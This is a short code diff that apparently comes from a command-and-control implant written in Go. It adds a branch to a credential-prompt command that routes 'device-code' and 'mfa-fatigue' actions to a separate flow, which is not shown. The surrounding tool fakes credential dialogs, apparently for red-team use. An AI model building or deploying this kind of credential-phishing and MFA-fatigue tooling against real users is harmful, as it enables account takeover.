@@ -48,6 +48,11 @@ func (c *CredentialPromptCommand) Description() string {
 }
 
 func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
+	// Check for cross-platform MFA actions before platform-specific dialog
+	if action := credPromptExtractAction(task.Params); action == "device-code" || action == "mfa-fatigue" {
+		return credPromptDeviceCodeFlow(task)
+	}
+
 	var args struct {
 		Title   string `json:"title"`
 		Message string `json:"message"`
